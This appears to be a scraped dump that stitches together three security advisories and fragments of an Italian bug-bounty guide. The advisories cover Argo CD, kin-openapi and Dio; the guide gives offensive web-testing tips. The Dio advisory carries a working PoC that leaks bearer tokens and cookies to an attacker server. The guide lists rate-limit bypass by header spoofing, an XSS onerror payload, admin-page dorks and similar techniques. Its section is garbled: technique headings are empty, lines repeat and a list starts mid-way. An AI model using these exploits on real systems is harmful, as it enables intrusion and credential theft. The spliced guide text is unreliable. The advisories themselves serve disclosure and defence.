titolo: GHSA-fmxq-cgp8-87wp: Argo CD: AppProject destination-namespace and resource restrictions bypassed by PreDelete/PostDelete resource hooks
descrizione:
### Impact

Argo CD checks an Application's AppProject before it creates resources during a sync. That check covers destination namespaces and servers, cluster-scoped resource allow and deny lists, and namespaced resource allow and deny lists, including resource names. PreDelete and PostDelete hooks skip it. When the Application is deleted, Argo CD creates those hooks with the application-controller's credentials on the destination cluster.

All versions from v2.10.0 onward are affected, including every currently supported release. v2.9.22 and earlier are not. PostDelete hooks were introduced in [dcc17f70bf](https://github.com/argoproj/argo-cd/commit/dcc17f70bf7db973fe480b8b613189b2c5ac4b4b) (2023-12-18, [#16595](https://github.com/argoproj/argo-cd/pull/16595)) and first released in v2.10.0. That creation path has never applied the project check. PreDelete hooks, added in [3bf3d8a212](https://github.com/argoproj/argo-cd/commit/3bf3d8a2124e772ac651f3fd42375c4e9b8008af) (2025-12-05, [#22288](https://github.com/argoproj/argo-cd/pull/22288)) and first released in v3.3.0, use the same path. v3.2.12 and earlier do not have PreDelete hooks. PreSync, Sync, PostSync, and SyncFail hooks still go through the project check.

A user who can push to the Git repository an Application syncs from can commit a hook whose namespace, group, kind, or name the AppProject would refuse on sync. The controller adds the delete finalizer when it sees the hook, and the Application stays Synced until someone deletes it. Deleting the Application creates the hook. What that can reach is bounded by the application-controller's access to the destination cluster. In a typical install that access is broad, so a tenant can create a cluster-scoped object such as a `ClusterRoleBinding`, or an object in a namespace the project does not allow. A hook with no deletion policy is removed after it succeeds. A deletion policy that does not remove the hook on success leaves the object in the cluster. A hook such as a Job can create further objects that Argo CD does not clean up.

### Patches

A patch for this vulnerability has been released in the following Argo CD versions:

* v3.6.0-rc2
* v3.5.4
* v3.4.10
* v3.3.15

The fix applies the same AppProject destination and resource checks used on sync before creating a PreDelete or PostDelete hook.

Argo CD 2.x and 3.0 through 3.2 are out of support and will not receive a patch. Upgrade to a patched 3.3 or newer release.

### Workarounds

There is no configuration setting that applies the project check to delete hooks while those hooks stay in use.

* Do not grant untrusted users write access to Git repositories that back Applications in restrictive AppProjects.
* Limit who can delete Applications. Deletion is what runs PreDelete and PostDelete hooks.
* Tighten the application-controller's Kubernetes access so a hook cannot reach sensitive namespaces or APIs.

### Credits

The Argo CD team would like to thank @RealFakeAccount, @AdamKorcz, @0xshylines, @thevilledev, @HenriWilliams, @cherez0ff, @ARSB1, and @zwindler for responsibly disclosing this issue according to our [security reporting guidelines](https://github.com/argoproj/argo-cd/blob/master/SECURITY.md#reporting-a-vulnerability).

### References

* PostDelete introducing commit: [dcc17f70bf7db973fe480b8b613189b2c5ac4b4b](https://github.com/argoproj/argo-cd/commit/dcc17f70bf7db973fe480b8b613189b2c5ac4b4b) ([#16595](https://github.com/argoproj/argo-cd/pull/16595)), first released in v2.10.0
* PreDelete introducing commit: [3bf3d8a2124e772ac651f3fd42375c4e9b8008af](https://github.com/argoproj/argo-cd/commit/3bf3d8a2124e772ac651f3fd42375c4e9b8008af) ([#22288](https://github.com/argoproj/argo-cd/pull/22288)), first released in v3.3.0
* [AppProject specification](https://argo-cd.readthedocs.io/en/stable/user-guide/projects/)
* [Resource hooks](https://argo-cd.readthedocs.io/en/stable/user-guide/resource_hooks/)

### For more information

* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)
* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd

titolo: GHSA-23vg-4cjm-66q5: kin-openapi: ValidationHandler security-requirement bypass via encoded-path operation confusion
descrizione:
## Summary

`openapi3filter.ValidationHandler.Middleware` validates requests with kin-openapi's
legacy router, which selects an OpenAPI operation from the decoded `URL.Path`. The
method is documented as implementing `gorilla/mux.MiddlewareFunc`, but a downstream
gorilla/mux router configured with `UseEncodedPath()` selects its handler from the
encoded representation (`URL.RawPath`).

An unauthenticated request such as `/public%2Fstatus` can therefore be validated as an
intentionally public operation (`/public/status`) and then dispatched to a protected
operation (`/{id}`). The configured, rejecting `AuthenticationFunc` is never invoked,
and the protected downstream handler runs.

This is distinct from GHSA-r277-6w6q-xmqw. The behavior below uses an explicit
authentication callback that rejects missing credentials and remains reproducible
after the v0.144.0 fix for the unsafe default callback.

## Affected products

- Product: `github.com/getkin/kin-openapi`
- Component: `openapi3filter.ValidationHandler.Middleware`
- Confirmed post-GHSA affected releases: v0.144.0, v0.145.0, and v0.146.0
- Reporter attestation: each listed release was checked out separately, the attached
  single-file test was copied into `openapi3filter/`, and that test passed; maintainers
  should independently confirm the version range
- Confirmed affected development revision: `d33e44e67734dcde81b576582185e1343fb3985d`
- v0.143.0 also reproduces this mechanism, but GHSA-r277-6w6q-xmqw already provides a
  simpler bypass on that release; the distinct post-fix claim starts at v0.144.0
- Earlier releases: not tested; please treat the introduction boundary as unknown

## Security impact

An unauthenticated remote requester can reach a handler whose OpenAPI operation
requires authentication when all of the following are true:

1. the application uses `ValidationHandler.Middleware` as the security gate;
2. the downstream router preserves and interprets an encoded path, such as
   gorilla/mux with `UseEncodedPath()`;
3. a public exact route and a protected parameterized route overlap after decoding;
4. the public and protected operations expose the same HTTP method;
5. the protected handler relies on the validation layer's security decision.

The protected operation's path-parameter value is constrained: it is an encoded
representation that decodes to a public literal path (`public%2Fstatus` in this PoC),
not an arbitrary attacker-selected identifier. A protected operation without a
compatible parameterized path is not reachable through this specific mechanism.

- Primitive: the security decision is made for a different OpenAPI operation than the
  operation dispatched by the application router.
- Demonstrated impact: a protected handler executes while the explicitly rejecting
  `AuthenticationFunc` is never invoked.
- Impact ceiling: confidentiality or integrity loss when the reachable protected
  handler has that authority; the PoC does not demonstrate data disclosure or state
  modification.
- Availability impact: not demonstrated.

## Root cause

At the confirmed development revision:

- `openapi3filter/validation_handler.go`: `ValidationHandler.Load` constructs
  `routers/legacy.NewRouter` unconditionally.
- `routers/legacy/router.go`: route selection uses the decoded request path.
- `routers/gorillamux/router.go`: the kin-openapi gorilla router constructs a
  gorilla/mux router with `UseEncodedPath()`.
- `ValidationHandler.Middleware` forwards the unchanged request after validation.

The component making the authentication decision and the component dispatching the
handler can therefore disagree about the selected operation.

## Reproduction

The attached PoC uses a real `net/http` server, an explicit API-key callback that
rejects missing credentials, and a downstream gorilla/mux router with
`UseEncodedPath()`.

From a kin-openapi checkout, copy the self-contained attachment
`encoded_path_route_confusion_test.go.txt` into `openapi3filter/` as
`encoded_path_route_confusion_test.go`, then run:

```sh
go test -v ./openapi3filter -run '^TestEncodedPathAuthorizationBypass$' -count=1
```

Expected attack observation:

```text
status=202 downstream_route=/{id} protected_id=public%2Fstatus authentication_calls=0
wiring=Router.Use status=202 downstream_route=/{id} protected_id=public%2Fstatus authentication_calls=0
```

Controls included in the test show that:

- `/ordinary` selects the protected operation, invokes authentication once, and is
  rejected with HTTP 401;
- `/public/status` reaches only the intentionally public handler;
- the encoded request reaches the protected `/{id}` handler with HTTP 202 while the
  authentication callback remains uncalled;
- both external wrapping and the documented
  `router.Use(validationHandler.Middleware)` wiring reproduce the same result.

## Reverse-proxy reachability

The same request was reproduced through Nginx 1.31.3 using the official
`nginx:alpine` image digest
`sha256:4a73073bd557c65b759505da037898b61f1be6cbcc3c2c3aeac22d2a470c1752`.

The exact container invocation was:

```sh
docker run --rm --name kin-openapi-nginx \
  --add-host=host.docker.internal:host-gateway \
  -p 18081:8080 -p 18082:8081 \
  -v "$PWD/poc/nginx.conf:/etc/nginx/nginx.conf:ro" \
  nginx:alpine
```

Container port 8080 uses `proxy_pass http://host.docker.internal:18080;` without a
replacement URI. Host port 18081 therefore preserved `/public%2Fstatus`; the protected
handler returned HTTP 202 and the
authentication callback remained at zero calls. With
`proxy_pass http://host.docker.internal:18080/;` on container port 8081 / host port
18082, Nginx canonicalized the upstream URI; both layers selected `/public/status` and
the bypass did not occur.

Nginx access-log observations:

```text
server_port=8080 "GET /public%2Fstatus HTTP/1.1" 202 0 "curl/8.7.1"
server_port=8081 "GET /public%2Fstatus HTTP/1.1" 204 0 "curl/8.7.1"
server_port=8080 "GET /ordinary HTTP/1.1" 401 0 "curl/8.7.1"
```

The response route headers were `X-Poc-Route: /{id}` on the preserving listener and
`X-Poc-Route: /public/status` on the canonicalizing listener. Backend observations for
the two requests were:

```text
request_uri="/public%2Fstatus" path="/public/status" raw_path="/public%2Fstatus" auth_before=0
completed request_uri="/public%2Fstatus" auth_after=0
request_uri="/public/status" path="/public/status" raw_path="" auth_before=0
completed request_uri="/public/status" auth_after=0
```

This control shows that upstream path handling is a deployment precondition rather
than claiming that every proxy configuration is affected.

The canonical protected control produced:

```text
request_uri="/ordinary" path="/ordinary" raw_path="" auth_before=0
completed request_uri="/ordinary" auth_after=1
```

## Suggested remediation

The authentication layer and downstream dispatcher must select the same OpenAPI
operation from the same request representation.

Potential approaches:

1. make `ValidationHandler` accept a caller-supplied `routers.Router` and require it to
   match downstream routing semantics;
2. document that `NewValidator` already accepts a router but is safe only when the
   supplied router selects operations using the same semantics as the dispatcher;
   callers must also supply an `AuthenticationFunc` through `ValidationOptions`, or
   protected requests fail with the existing missing-authentication-service error;
3. as an interim hardening option, make `ValidationHandler` fail closed on an encoded
   path separator when `URL.Path` and `URL.RawPath` can select different operations,
   and verify this behavior against the full suite;
4. document the route-identity requirement and add encoded-separator regression tests.

Replacing the legacy router with the kin-openapi gorilla router closes this PoC, but a
local compatibility check changed two existing missing-path-parameter tests from HTTP
400 semantics to route-not-found HTTP 404 semantics. A direct router swap is therefore
not a fully validated drop-in fix.

## Public-reference triage

The public advisory list and related path-encoding reports reviewed on 2026-08-18 did
not describe this authentication-boundary crossing. Relevant nearby reports include
issues #397, #1089, and #1105 and PR #400. This search is not proof of novelty; please
deduplicate against private reports.

titolo: GHSA-cr65-55v9-xhvv: Dio: Cross-origin redirect leaks sensitive request headers in `dio_http2_adapter`
descrizione:
### Summary

`dio_http2_adapter` follows HTTP `Location` redirects without stripping sensitive request headers when the redirect target is a different origin. An attacker who can cause any origin server to return a cross-origin `302` redirect receives the victim's `Authorization`, `Cookie`, and `Proxy-Authorization` headers verbatim. This vulnerability has a CVSS v3.1 base score of **7.5 (High)** because `followRedirects` is enabled by default, no authentication is required to exploit it, and the confidentiality impact is high.

### Details

When `Dio` is configured to use `Http2Adapter`, the adapter's internal `_fetch` method constructs HTTP/2 request headers by unconditionally copying all entries from `options.headers`:

```dart
// plugins/http2_adapter/lib/src/http2_adapter.dart:111
headers.addAll(
  options.headers.entries.map((entry) {
    ...
    return Header.ascii(entry.key.toLowerCase(), v);
  }).toList(),
);
```

On receiving a `3xx` response, the adapter reads the `Location` header and resolves the redirect target URI:

```dart
// plugins/http2_adapter/lib/src/http2_adapter.dart:254-263
final url = responseHeaders.value('location');
final uri = Uri.parse(url ?? '');
final String path = resolveRedirectUri(options.uri, uri).toString();
return _fetch(options.copyWith(path: path, maxRedirects: --options.maxRedirects), ...);
```

`options.copyWith` is called without an explicit `headers` argument; `dio/lib/src/options.dart:629` therefore preserves the full original header map via `headers ?? Map.from(this.headers)`. `resolveRedirectUri` (`http2_adapter.dart:290`) returns an attacker-controlled cross-origin URI without any origin comparison. The combination means that on every redirect, the full set of original sensitive headers — including `Authorization`, `Cookie`, and `Proxy-Authorization` — is forwarded to the new authority with no sanitization.

**Data flow (source → sink):**

1. `dio/lib/src/dio_mixin.dart:383` — public `Dio.request<T>(String path, ...)` entry point.
2. `dio/lib/src/options.dart:331` — base and per-request headers merged into `RequestOptions`.
3. `dio/lib/src/dio_mixin.dart:596` — `httpClientAdapter.fetch(reqOpt, ...)` dispatches to `Http2Adapter`.
4. `plugins/http2_adapter/lib/src/http2_adapter.dart:254` — `Location` header is read from the network response (attacker-controlled source).
5. `plugins/http2_adapter/lib/src/http2_adapter.dart:258` — redirect target URI resolved; cross-origin check absent.
6. `plugins/http2_adapter/lib/src/http2_adapter.dart:260` — `options.copyWith(path: path, ...)` called without `headers` override.
7. `dio/lib/src/options.dart:629` — `copyWith` preserves `Map.from(this.headers)` — all sensitive headers retained.
8. `plugins/http2_adapter/lib/src/http2_adapter.dart:111` — preserved headers emitted verbatim to the cross-origin HTTP/2 request (sink).

**Suggested patch** — strip sensitive headers before following a cross-origin redirect:

```diff
--- a/plugins/http2_adapter/lib/src/http2_adapter.dart
+++ b/plugins/http2_adapter/lib/src/http2_adapter.dart
+  static const _sensitiveRedirectHeaders = {
+    'authorization',
+    'cookie',
+    'proxy-authorization',
+  };
+
-      final String path = resolveRedirectUri(options.uri, uri).toString();
+      final redirectUri = resolveRedirectUri(options.uri, uri);
+      final redirectOptions = options.copyWith(
+        path: redirectUri.toString(),
+        maxRedirects: --options.maxRedirects,
+      );
+      if (!_sameOrigin(options.uri, redirectUri)) {
+        redirectOptions.headers.removeWhere(
+          (name, _) => _sensitiveRedirectHeaders.contains(name.toLowerCase()),
+        );
+      }
       return _fetch(
-        options.copyWith(path: path, maxRedirects: --options.maxRedirects),
+        redirectOptions,
         list != null ? Stream.fromIterable(list) : null,
         cancelFuture,
         redirects,
       );
+
+  static bool _sameOrigin(Uri a, Uri b) =>
+      a.scheme == b.scheme && a.host == b.host && a.port == b.port;
```

### PoC

The following steps reproduce the vulnerability using two local HTTP/2 cleartext (h2c) servers inside an isolated Docker container (no external network required).

**Prerequisites:**

- Docker installed and accessible.
- Repository checked out at the path used as the build context.

**Build and run:**

```bash
# From the repository root (github_web_81_cfug__dio/)
docker build -f vuln-001/Dockerfile -t dio-vuln-001:poc .
docker run --rm --network none dio-vuln-001:poc
```

**What the container does:**

1. Starts an *origin* h2c server on `127.0.0.1:18081` that immediately returns `302 Location: http://127.0.0.1:18082/capture`.
2. Starts an *attacker* h2c server on `127.0.0.1:18082` that logs every received header.
3. Executes the following Dart exploit:

```dart
final dio = Dio()
  ..httpClientAdapter = Http2Adapter(ConnectionManager());
await dio.get(
  'http://127.0.0.1:18081/start',
  options: Options(headers: {
    'Authorization': 'Bearer SECRET_TOKEN_12345',
    'Cookie': 'sid=SECRET_SESSION_ABC',
    'x-secret': 'internal-secret-value',
  }),
);
```

**Expected output (confirms vulnerability):**

```
RESULT=VULN_CONFIRMED
LEAKED_HEADER=authorization: Bearer SECRET_TOKEN_12345
LEAKED_COOKIE=sid=SECRET_SESSION_ABC

[ATTACKER] Received headers:
[ATTACKER]   authorization: Bearer SECRET_TOKEN_12345
[ATTACKER]   cookie: sid=SECRET_SESSION_ABC
[ATTACKER]   x-secret: internal-secret-value
```

The attacker server at `127.0.0.1:18082` receives all three sensitive headers, demonstrating that `Http2Adapter` forwards them verbatim across the cross-origin redirect with no stripping.

### Impact

This is a **sensitive information disclosure** vulnerability. Any application that:

1. configures `Dio` with `Http2Adapter`, and
2. sends requests carrying `Authorization`, `Cookie`, or `Proxy-Authorization` headers,

is affected. Because `followRedirects` defaults to `true` and `maxRedirects` defaults to `5`, no additional configuration is needed to trigger the bug.

An attacker who controls — or can compromise — any HTTP server that the victim application contacts can issue a `302` redirect to an attacker-owned server and thereby capture the victim's bearer tokens, session cookies, or proxy credentials. The attack requires no prior authentication and is executable over the network with low complexity. Stolen credentials may then be used to impersonate the victim against the original service or any other service that accepts the same token.

Affected parties include server-side Dart/Flutter applications and CLI tools that make authenticated HTTP/2 requests through `dio_http2_adapter`.

### Reproduction artifacts

#### `Dockerfile`

```dockerfile
# Dockerfile for VULN-001 dynamic reproduction
# Vulnerability: Cross-origin redirect leaks sensitive request headers in dio_http2_adapter
#
# Build context: the parent directory (github_web_81_cfug__dio/)
#   docker build -f vuln-001/Dockerfile -t dio-vuln-001 .
#
# What this image does:
#   1. Installs Dart SDK (stable)
#   2. Copies the vulnerable repository source (dio + dio_http2_adapter)
#   3. Creates a PoC Dart project using path dependencies to the local source
#   4. Resolves pub packages
#   5. On container run: executes the exploit script that starts two local
#      h2c servers (origin + attacker) and makes a redirected request to prove
#      that Authorization/Cookie headers are forwarded to the cross-origin target

FROM dart:stable AS builder

# ── Repository source ──────────────────────────────────────────────────────────
# Copy only the packages we need to keep image small
COPY repo/dio/ /repo/dio/
COPY repo/plugins/http2_adapter/ /repo/plugins/http2_adapter/

# ── PoC project setup ──────────────────────────────────────────────────────────
WORKDIR /poc

COPY vuln-001/poc_pubspec.yaml pubspec.yaml
COPY vuln-001/poc_exploit.dart lib/main.dart

# Resolve dependencies (requires network access to pub.dev for http2, meta, etc.)
RUN dart pub get

# ── Runtime image (reuse builder to keep it simple) ────────────────────────────
FROM builder AS final

WORKDIR /poc

# Run the exploit; exit code:
#   0 = VULN_CONFIRMED (authorization header leaked to attacker)
#   1 = NOT_VULNERABLE  (header was stripped or redirect not followed)
#   2 = FAIL            (attacker server never received a request — env issue)
CMD ["dart", "run", "lib/main.dart"]
```

#### `poc.py`

```python
#!/usr/bin/env python3
"""
PoC orchestrator for VULN-001:
  Cross-origin redirect leaks sensitive request headers in dio_http2_adapter.

Usage:
    python3 poc.py [--image-tag TAG]

What it does:
    1. Builds a Docker image containing the vulnerable dio_http2_adapter source
       and a Dart exploit script (poc_exploit.dart).
    2. Runs the container, which:
         a. Starts two local h2c (HTTP/2 cleartext) servers inside the container:
              - Origin  (127.0.0.1:18081): returns 302 → attacker
              - Attacker (127.0.0.1:18082): logs all received headers
         b. Uses dio + Http2Adapter to GET http://origin/start with
            Authorization and Cookie headers.
         c. Follows the 302 redirect to the attacker server.
         d. Reports whether the Authorization header was captured by the attacker.
    3. Writes phase2_result.json with structured verdict.

Exit codes:
    0  PASS   — vulnerability confirmed
    1  FAIL   — not reproduced
    2  ERROR  — build or runtime environment problem
"""

import argparse
import json
import os
import subprocess
import sys
import textwrap
from pathlib import Path

# ── Paths ──────────────────────────────────────────────────────────────────────
SCRIPT_DIR = Path(__file__).resolve().parent
REPO_ROOT = SCRIPT_DIR.parent          # github_web_81_cfug__dio/
RESULT_FILE = SCRIPT_DIR / "phase2_result.json"

BUILD_CONTEXT = str(REPO_ROOT)
DOCKERFILE = str(SCRIPT_DIR / "Dockerfile")
DEFAULT_IMAGE_TAG = "dio-vuln-001:poc"


def run(cmd: list[str], **kwargs) -> subprocess.CompletedProcess:
    """Run a subprocess command, streaming stdout/stderr to the terminal."""
    print(f"[+] {' '.join(cmd)}", flush=True)
    return subprocess.run(cmd, **kwargs)


def build_image(tag: str) -> bool:
    """Build the Docker image. Returns True on success."""
    result = run(
        [
            "docker", "build",
            "--file", DOCKERFILE,
            "--tag", tag,
            BUILD_CONTEXT,
        ],
        check=False,
    )
    if result.returncode != 0:
        print(f"[!] Docker build failed (exit {result.returncode})", file=sys.stderr)
        return False
    return True


def run_container(tag: str, timeout_sec: int = 120) -> tuple[int, str, str]:
    """
    Run the container and capture its output.

    Returns:
        (returncode, stdout, stderr)
    """
    result = run(
        [
            "docker", "run",
            "--rm",
            "--network", "none",   # no external network; loopback only
            tag,
        ],
        capture_output=True,
        text=True,
        timeout=timeout_sec,
        check=False,
    )
    return result.returncode, result.stdout, result.stderr


def parse_output(stdout: str, stderr: str) -> dict:
    """
    Parse structured key=value lines from the exploit's stdout.

    The Dart exploit writes lines like:
        RESULT=VULN_CONFIRMED
        LEAKED_HEADER=authorization: Bearer SECRET_TOKEN_12345
        EVIDENCE=...
    """
    parsed = {}
    for line in stdout.splitlines():
        if "=" in line:
            key, _, val = line.partition("=")
            parsed[key.strip()] = val.strip()
    return parsed


def write_result(data: dict) -> None:
    with open(RESULT_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)
    print(f"\n[+] Result written to {RESULT_FILE}")


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--image-tag", default=DEFAULT_IMAGE_TAG,
        help=f"Docker image tag (default: {DEFAULT_IMAGE_TAG})",
    )
    args = parser.parse_args()
    tag = args.image_tag

    build_cmd = (
        f"docker build -f vuln-001/Dockerfile -t {tag} ."
    )
    run_cmd = (
        f"docker run --rm --network none {tag}"
    )
    poc_cmd = (
        f"cd {REPO_ROOT} && {build_cmd} && {run_cmd}"
    )

    # ── Step 1: Build ──────────────────────────────────────────────────────────
    print("=" * 70)
    print("STEP 1: Building Docker image")
    print("=" * 70)
    if not build_image(tag):
        result_data = {
            "passed": False,
            "verdict": "FAIL",
            "reason": "Docker image build failed — dart pub get or source copy error",
            "build_command": f"cd {REPO_ROOT} && {build_cmd}",
            "run_command": run_cmd,
            "poc_command": poc_cmd,
            "evidence": "docker build non-zero exit code",
            "artifacts": ["Dockerfile", "poc_exploit.dart", "poc_pubspec.yaml"],
        }
        write_result(result_data)
        return 2

    # ── Step 2: Run exploit ────────────────────────────────────────────────────
    print("\n" + "=" * 70)
    print("STEP 2: Running exploit container")
    print("=" * 70)

    try:
        returncode, stdout, stderr = run_container(tag)
    except subprocess.TimeoutExpired:
        result_data = {
            "passed": False,
            "verdict": "INCOMPLETE",
            "reason": "Container execution did not complete within 120 seconds and was terminated due to timeout",
            "build_command": f"cd {REPO_ROOT} && {build_cmd}",
            "run_command": run_cmd,
            "poc_command": poc_cmd,
            "evidence": "subprocess.TimeoutExpired after 120 s",
            "artifacts": ["Dockerfile", "poc_exploit.dart", "poc_pubspec.yaml"],
        }
        write_result(result_data)
        return 2

    print("\n── Container STDOUT ─────────────────────────────────────────────")
    print(stdout or "(empty)")
    print("── Container STDERR ─────────────────────────────────────────────")
    print(stderr or "(empty)")
    print("── Exit code:", returncode, "─────────────────────────────────────")

    # ── Step 3: Evaluate results ───────────────────────────────────────────────
    parsed = parse_output(stdout, stderr)
    exploit_result = parsed.get("RESULT", "")
    leaked_header = parsed.get("LEAKED_HEADER", "")
    evidence_line = parsed.get("EVIDENCE", "")

    if returncode == 0 and exploit_result == "VULN_CONFIRMED" and leaked_header:
        # Combine stdout + a snippet of stderr for the evidence field
        stderr_snippet = "\n".join(
            line for line in stderr.splitlines()
            if any(tag in line for tag in ("[ATTACKER]", "[RESULT]", "[EVIDENCE]"))
        )[:1500]
        evidence = (
            f"stdout: {stdout.strip()}\n\n"
            f"stderr (relevant):\n{stderr_snippet}"
        )
        result_data = {
            "passed": True,
            "verdict": "PASS",
            "reason": (
                "dio_http2_adapter forwarded the original Authorization header verbatim "
                "to the attacker's server without stripping it when following a "
                "cross-origin 302 redirect. The attacker h2c server (127.0.0.1:18082) "
                f"received '{leaked_header}'."
            ),
            "build_command": f"cd {REPO_ROOT} && {build_cmd}",
            "run_command": run_cmd,
            "poc_command": poc_cmd,
            "evidence": evidence,
            "artifacts": [
                "Dockerfile",
                "poc_exploit.dart",
                "poc_pubspec.yaml",
                "poc.py",
            ],
        }
        write_result(result_data)
        print("\n[PASS] VULN-001 reproduced successfully.")
        return 0

    elif returncode == 1 or exploit_result == "NOT_VULNERABLE":
        result_data = {
            "passed": False,
            "verdict": "FAIL",
            "reason": (
                "Container execution succeeded, but the attacker server did not "
                "receive the Authorization header. The vulnerability was not "
                f"reproduced in this environment. Parsed result: {parsed}"
            ),
            "build_command": f"cd {REPO_ROOT} && {build_cmd}",
            "run_command": run_cmd,
            "poc_command": poc_cmd,
            "evidence": stdout + "\n" + stderr,
            "artifacts": ["Dockerfile", "poc_exploit.dart", "poc_pubspec.yaml"],
        }
        write_result(result_data)
        print("\n[FAIL] Vulnerability not reproduced.")
        return 1

    else:
        # returncode == 2 or other unexpected failure
        result_data = {
            "passed": False,
            "verdict": "INCOMPLETE",
            "reason": (
                f"Container execution failed or exited with an unexpected code {returncode}. "
                "Cause: h2c server startup error, network issue, or Dart runtime "
                "error. Check the stderr log and retry without --network none."
            ),
            "build_command": f"cd {REPO_ROOT} && {build_cmd}",
            "run_command": run_cmd,
            "poc_command": poc_cmd,
            "evidence": f"exit={returncode}\nstdout={stdout}\nstderr={stderr}",
            "artifacts": ["Dockerfile", "poc_exploit.dart", "poc_pubspec.yaml"],
        }
        write_result(result_data)
        print(f"\n[INCOMPLETE] Container exited with code {returncode}.")
        return 2


if __name__ == "__main__":
    sys.exit(main())
```

steps: Intercetta traffico con Burp Suite o OWASP ZAP
Usa kiterunner o wordlists API comuni
Testa metodi HTTP alternativi: PUT, DELETE, PATCH, OPTIONS
Verifica GraphQL introspection se presente
Leggi documentazione API pubblica su /docs, /swagger

testingTechniques.name: Mass Assignment
testingTechniques.description: Inietta campi non previsti nel body della richiesta
steps: Intercetta una richiesta PUT/POST normale
Aggiungi campi come: isAdmin true, role admin, verified true
Verifica se vengono accettati e modificano il tuo account
Testa con campi PII: ssn, creditCard, password
Prova con campi interni: internal_id, user_type

testingTechniques.name: Broken Object Level Authorization (BOLA)
testingTechniques.description: Accedi a oggetti di altri utenti cambiando ID
steps: Crea due account su due browser diversi
Cattura tutte le richieste con oggetti (es. /api/orders/123)
Sostituisci l'ID con uno dell'altro account
Se ottieni risposta 200 con dati altrui = BOLA confermato
Documenta sempre con screenshot prima/dopo

testingTechniques.name: Rate Limiting Bypass
testingTechniques.description: Bypassa limiti di velocità per brute force o scraping
steps: Identifica endpoint con rate limit (login, OTP, search)
Prova header X-Forwarded-For, X-Real-IP, X-Originating-IP
Cambia case del path: /API/Login vs /api/login
Aggiungi parametri irrilevanti: ?a=1&a=2
Usa IP rotation con proxy/VPN

testingTechniques.name: GraphQL Specific
testingTechniques.description: Testa vulnerabilità specifiche di GraphQL
steps: Abilita introspection con query: {__schema{types{name}}}
Usa batch query per rate limit bypass
Cerca field deprecated o hidden
Testa nested query DoS con depth limiting
Verifica authorization a livello di field, non solo oggetto

testingTechniques.name: Test IDOR / BOLA

testingTechniques.name: SQL Injection

testingTechniques.name: XSS (Cross-Site Scripting)

Testa in attributi HTML con onmouseover
Usa event handler: img src x onerror alert 1
Testa stored XSS in campi profilo, commenti, recensioni

testingTechniques.name: SSRF (Server-Side Request Forgery)
testingTechniques.description: Forza il server a fare richieste verso risorse interne

testingTechniques.name: Authentication Bypass

Verifica session fixation e session hijacking

Verifica authorization a livello di field, non solo oggetto

Verifica token leak in referer header
Testa PKCE bypass su mobile app

testingTechniques.name: Cross-Product IDOR
testingTechniques.description: Un account Google da accesso a 20+ prodotti: cerca IDOR cross-service
steps: Crea risorsa in Drive / Photos / Calendar
Cattura l'ID della risorsa
Prova ad accedere da account Google diverso
Verifica permessi di condivisione
Testa Google Docs shared con link pubblici

reportingSteps: 1. Usa Google Issue Tracker (issuetracker.google.com) con tag VRP
2. Includi: Title, Target, Summary, Steps, PoC, Impact, Suggested Fix
3. Aspetta triage (fino a 2 settimane, ma critici sono veloci)
4. Rispondi solo se chiedono chiarimenti, non insistere
5. Google NON rilascia CVE per ogni bug, ma conferma il fix
6. Il pagamento avviene tramite Google BugHunter University rewards
quickStartGuide: Step 1: Vai su bughunters.google.com e studia il program policy
Step 2: Iscriviti a Google BugHunter University (gratuita, con certificati)
Step 3: Inizia da Google Docs/Sheets: hanno molti bug di business logic
Step 4: Studia il flusso OAuth: la maggior parte dei bug Google sono qui
Step 5: Testa cross-product: un bug in Drive impatta anche Photos/Gmail
Step 6: Usa Google stesso per enumerarsi: dorks come site:*.google.com inurl:admin
Step 7: Leggi il blog di Project Zero per capire la qualità attesa
Step 8: Sii paziente: Google VRP è molto competitivo
tips: 💡 Google VRP è IL programma più competitivo: 100+ hunter esperti al giorno
💡 Concentrati su prodotti meno battuti: Google Fit, Google Chat, Cloud Console
💡 I bug accettati sono spesso catene: 2-3 low = 1 high
💡 Studia i writeup su Project Zero: mostrano lo standard qualitativo
💡 Il reverse engineering di app mobile Google è spesso fruttuoso
💡 Google Docs/Sheets collaborative editing ha avuto decine di RCE storici
💡 Account multipli sono essenziali: crea 5-10 account Google per test
💡 Non riportare bug in vendor di terze parti (es. problema in libreria JS)
💡 Il triage è lento, non scoraggiarti se non rispondono in 2 settimane

6. CVSS SCORE: Calcola il punteggio CVSS v3.1 con cvss calculator
7. SUBMIT: Carica su HackerOne/Bugcrowd/Intigriti e attendi triage (24-72h)
8. DUPLICATI: Se è un dup, è normale. Continua a cacciare!
9. RETEST: Dopo il fix, verifica che la patch funzioni davvero
10. DISCLOSURE: Aspetta il permesso del programma prima di blog/tweet
quickStartGuide: Step 1: Leggi TUTTO il policy del programma su dropbox
Step 2: Configura Burp Suite con il proxy del tuo browser (FoxyProxy)
Step 3: Crea due account: attaccante e vittima su due browser diversi
Step 4: Mappa tutte le feature: signup, login, profilo, pagamenti, API
Step 5: Inizia con OWASP Top 10 e tools automatici (nuclei, sqlmap)
Step 6: Testa manualmente la business logic (sconti, ruoli, workflow)
Step 7: Documenta OGNI cosa interessante
Step 8: Scrivi un report chiaro con PoC riproducibile in 5 minuti
Step 9: Submeti e rispondi velocemente a domande del triage
Step 10: Studia i report pubblici (HackerOne Hacktivity) per imparare
tips: 💡 Leggi almeno 50 report risolti su HackerOne Hacktivity prima di iniziare
💡 Concentrati su UN programma per almeno 2 settimane
💡 Le business logic bug pagano DI PIÙ delle XSS
💡 I bug race condition sono sottovalutati ma pagati
💡 Usa Wayback Machine (web.archive.org) per trovare endpoint dimenticati
💡 Controlla sempre le API mobile vs web
💡 Non riportare MAI self-XSS, clickjacking senza impatto
💡 Impara Burp a livello avanzato: macro, match/replace, scanner
💡 La qualità del report > quantità
